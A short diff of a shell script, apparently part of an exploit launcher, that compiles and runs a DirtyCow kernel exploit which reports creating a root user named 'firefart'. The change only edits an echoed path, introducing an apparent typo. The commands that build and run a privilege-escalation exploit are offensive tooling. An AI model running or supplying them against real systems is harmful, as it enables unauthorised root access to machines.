@@ -77,7 +77,7 @@ fi
 if [[ "$*" == "-DirtyCow" ]]; then
      gcc -pthread ${PWD}/exploits/DirtyCow/dirtycow.c -o ${PWD}/exploits/DirtyCow/dcow -lcrypt
      echo "[+] Compilation successfuly !"
-     echo "[+] PATH=${PWD}/exploits/DirtyCow/dcow"
+     echo "[+] PATH=${PWD}/exploit/DirtyCow/dcow"
      echo "[+] Executing the binary..."
      ${PWD}/exploits/DirtyCow/dcow test
      echo "[+] User firefart created"
